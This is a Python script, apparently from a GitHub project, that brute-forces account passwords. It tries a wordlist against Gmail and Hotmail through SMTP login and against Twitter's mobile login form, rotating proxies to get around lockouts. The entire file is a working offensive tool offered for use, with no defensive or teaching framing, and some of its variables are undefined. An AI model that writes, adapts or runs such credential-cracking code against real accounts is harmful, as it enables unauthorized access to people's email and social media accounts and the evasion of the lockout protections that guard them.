#!/usr/bin/python

import smtplib
import threading
from optparse import *
import time
from proxylist import ProxyList
from mechanize import Browser
from os import *
import sys
import logging
import io
R = '\033[31m'  # red
G = '\033[32m'  # green
W = '\033[0m' # white (normal)
use = OptionParser("""{}
_____________________                              _____________________
`-._:  .:'   `:::  .:\           |\__/|           /::  .:'   `:::  .:.-'
    \      :          \          |:   |          /         :       /    
     \     ::    .     `-_______/ ::   \_______-'   .      ::   . /      
      |  :   :: ::'  :   :: ::'  :   :: ::'      :: ::'  :   :: :|       
      |     ;::         ;::         ;::         ;::         ;::  |       
      |  .:'   `:::  .:'   `:::  .:'Ksa`:::  .:'   `:::  .:'   `:|       
      /     :           :           :           :           :    \       
     /______::_____     ::    .     ::    .     ::   _____._::____\      
                   `----._:: ::'  :   :: ::'  _.----'                    
                          `--.       ;::  .--'                           
                              `-. .:'  .-'                               
                                 \    / https://github.com/Matrix07ksa/                                        
                               Hejab_Zaeri
                                  \  /                                   
                                   \/ 
{}
-----------------------------------------------------------------------
-g --gmail                              ACCOUNT gmail @gmail.com
-t --hotmail                            ACCOUNT hotmail @hotmail.com
-T --twitter                            ACCOUNT  twitter @
-l --list                               List    Password BrutoForce
-p --password                           Single  Password
                            
							   """.format(G,R))

use.add_option("-g","--gmail",dest="gmail",help="Write Your Account gmail")
use.add_option("-t","--hotmail",dest="hotmail",help="Write Your Account hotmail")
use.add_option("-T","--twitter",dest="twitter",help="Write Your Account twitter")
use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
(options,args) = use.parse_args()

brows = Browser()
brows.set_handle_robots(False)
brows._factory.is_html = True
brows.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]

def proxy():
    logging.basicConfig()
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        sys.exit('[!] Proxy File format has incorrect | EXIT...')
    pl.random()
    getProxy = pl.random().address()
    browser.set_proxies(proxies={"https": getProxy})
    try:
        checkProxyIP = browser.open("https://api.ipify.org/?format=raw", timeout=2)
    except:
        return proxy()
   

def twitter():
    password_list = io.open(options.list_password,"r").readlines()
    try_login = 0
    print("\rTwitter Account: {}".format(options.twitter))
    print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,W))
    for password in password_list:
        password = password.rstrip('\n')
        try_login += 1
        if try_login == 10:
            try_login = 0
            proxy()
        print('\rPassword [==] {} '.format(password).rstrip("\n"))
        sys.stdout.flush
        url = "https://mobile.twitter.com/login"
        try:
            response = brows.open(url, timeout=5)
            brows.select_form(nr=0)
            brows.form['session[username_or_email]'] = options.twitter
            brows.form['session[password]'] = password
            brows.method = "POST"
            submit = brows.submit()
            if submit.geturl() == "https://mobile.twitter.com/home":
                print("{}True Password Found {}".format(G,password))
                break
            elif 'https://mobile.twitter.com/account/locked' in submit.geturl():
                proxy()
            else:
                print("%s[!] False Login Password%s\n"%(R,W))
        except:
            print('[!] <<<There are speeches in Communication>>> \n')
            proxy()

if options.gmail == None  :
    if options.hotmail == None :
        if options.twitter == None:
            print(use.usage)
            exit()       
    elif options.hotmail != None or options.gmail == None:
        smtp_srverH= smtplib.SMTP('smtp.live.com', 587)
        smtp_srverH.ehlo()
        smtp_srverH.starttls()
        if options.password != None or options.list_password == None  :
            print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,G))
            try :
                smtp_srverH.login(options.hotmail,options.password)
                print("FOUND Password :{} \t Found Hotmail:{}".format(options.password,options.hotmail))
            except :
                print("Not Found Password : {} \t Email Hotmail:{}".format(options.password,options.hotmail))
        elif options.list_password !=None or options.password == None :
            password_list = io.open(options.list_password,"r").readlines()
            for password in password_list:    
                try :
                    print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,G))
                    smtp_srverH.login(options.hotmail,password)
                    print("FOUND Password :{} \n Found Hotmail:{}".format(password,options.hotmail))
                except smtplib.SMTPAuthenticationError:
                    print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
    if options.twitter != None :
        hejab = threading.Thread(target=twitter,name="hejab")
        hejab.run()
elif options.gmail !=None or  options.hotmail== None or options.twitter==None:  
    smtp_srverG= smtplib.SMTP('smtp.gmail.com', 587)
    smtp_srverG.ehlo()
    smtp_srverG.starttls()
    if options.password != None or options.list_password == None  :
        print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,G))
        try :    
            smtp_srverG.login(options.gmail,options.password)
            print("FOUND Password :{} \t Found Gmail:{}".format(options.password,options.gmail))
        except :
            print("Not Found Password : {} \t Email Gmail:{}".format(options.password,options.gmail))
    elif options.list_password !=None:
        password_list = io.open(options.list_password,"r").readlines()
        for password in password_list:
            password = password.rstrip("\n")
            print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,G))
            try :    
                smtp_srverG.login(options.gmail,password)
                print("{}<<<+++FOUND Password :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
                break
            except smtplib.SMTPAuthenticationError:
                print("{}<<<---Not Found Password : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       
